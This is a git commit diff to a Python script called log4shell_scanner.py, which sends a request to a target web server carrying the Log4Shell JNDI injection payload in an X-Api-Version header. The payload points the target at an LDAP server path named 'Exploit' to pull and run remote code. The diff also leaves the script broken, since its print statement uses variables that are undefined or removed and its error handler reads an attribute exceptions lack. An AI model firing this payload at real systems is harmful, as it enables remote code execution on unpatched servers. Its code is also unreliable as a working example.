1eea6202ab92d4ed7bbd1943f945fb8a0eb6845a
gr4ysku11 <gr4ysku11@protonmail.com>
2021-12-15 15:00:45 -0800

    change host/ip addr as command line param

--- log4shell_scanner.py
+++ log4shell_scanner.py
@@ -1,17 +1,16 @@
 #!/bin/python3
-# log4shell_scanner.py <ip adrr> <port>
+# log4shell_scanner.py <http(s)://ip_or_hostname[:port]>
 
 import sys
 import requests
 
-rhost = sys.argv[1]
-rport = sys.argv[2]
+vuln_webserver = sys.argv[1]
 
 s = requests.Session()
 s.headers = {'X-Api-Version': '${jndi:ldap://127.0.0.1:1389/Exploit}'}
 try:
     print(f"probing {rhost}:{p}...")
-    r = s.get(f"https://{rhost}:{p}", verify=False, timeout=1)
+    r = s.get(f"{vuln_webserver}", verify=False, timeout=1)
     print(r.text)
 except Exception as e:
     print (e.text)
